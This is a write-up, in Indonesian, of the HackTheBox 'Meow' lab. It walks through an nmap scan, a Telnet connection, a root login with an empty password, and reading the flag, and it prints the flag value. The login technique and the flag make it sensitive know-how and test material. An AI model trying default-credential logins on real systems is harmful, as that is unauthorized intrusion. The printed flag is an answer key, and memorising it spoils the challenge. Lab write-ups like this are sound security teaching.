# Meow — Default Credentials via Telnet

**Date:** 2026-04-29
**Platform:** HackTheBox (Starting Point)
**Difficulty:** Very Easy
**Category:** Network / Linux

---

## Target

Mesin Linux (Ubuntu 20.04.2 LTS) milik HTB Starting Point. Mesin ini menjalankan service Telnet di port 23 tanpa konfigurasi keamanan yang memadai — cocok sebagai lab pengenalan enumeration dan eksploitasi default credentials.

## Vulnerability

Service Telnet aktif di port 23 dengan akun `root` yang tidak memiliki password. Ini adalah kesalahan konfigurasi klasik — administrator tidak mengganti default credentials, sehingga siapapun yang bisa konek ke port tersebut langsung mendapat akses root.

Selain itu, Telnet sendiri merupakan protokol yang tidak aman karena seluruh komunikasi dikirim dalam bentuk **plaintext** (tidak terenkripsi), sehingga rentan terhadap serangan sniffing.

## Tools Used

- Nmap (network scanner & service detection)
- Telnet (remote login client)
- OpenVPN (koneksi ke jaringan HTB)

---

## Exploitation Steps

### Step 1 — Koneksi VPN

Sebelum bisa mengakses mesin target, perlu konek ke jaringan private HTB via OpenVPN menggunakan file konfigurasi yang diunduh dari dashboard HTB.

```bash
sudo openvpn starting-point.ovpn
```

Verifikasi koneksi berhasil dengan ping ke target:

```bash
ping 10.129.1.131
```

Jika muncul reply, koneksi ke jaringan HTB sudah aktif.

---

### Step 2 — Enumeration dengan Nmap

Scan target untuk menemukan port yang terbuka dan service yang berjalan.

```bash
nmap -sV 10.129.1.131
```

Penjelasan switch:
- `-sV` → deteksi versi service di tiap port yang terbuka

Output relevan:

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

**Temuan:** Port 23 terbuka dan menjalankan service Telnet.

---

### Step 3 — Koneksi via Telnet

Karena port 23 terbuka, langsung coba konek menggunakan client Telnet.

```bash
telnet 10.129.1.131
```

Sistem menampilkan banner HTB dan prompt login:

```
Meow login:
```

---

### Step 4 — Mencoba Default Credentials

Karena ini mesin very easy, dicoba login dengan akun umum tanpa password:

```
login: root
password: (Enter — kosong)
```

Login berhasil. Sistem langsung menampilkan shell dengan akses root penuh:

```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

root@Meow:~#
```

---

### Step 5 — Mengambil Flag

Dari dalam shell, lihat isi direktori home:

```bash
ls
```

Output:

```
flag.txt  snap
```

Baca isi file flag:

```bash
cat flag.txt
```

Flag berhasil didapat.

---

## Proof

```
Flag: b40abfde23665f766f9c61ecba8a4c19
```

---

## Lessons Learned

- **Telnet sangat tidak aman** — tidak ada enkripsi sama sekali, semua data terkirim sebagai plaintext. Di lingkungan produksi modern, Telnet sudah seharusnya diganti dengan SSH.
- **Default credentials adalah celah nyata** — banyak device dan server di dunia nyata masih menggunakan username/password bawaan yang tidak pernah diganti.
- **Nmap `-sV`** sangat berguna untuk mengetahui versi service, bukan sekadar tahu port terbuka atau tidak.
- **Navigasi Linux dasar** seperti `ls`, `cat`, `cd ~` wajib dikuasai sebelum melakukan post-exploitation.
- Lag saat berada di dalam shell target adalah hal wajar karena koneksi melewati VPN — bukan masalah pada komputer lokal.
- Ke depannya perlu eksplorasi: scanning lebih agresif dengan `-p-` untuk menemukan port tersembunyi, dan membandingkan hasil Telnet vs SSH dari sisi keamanan.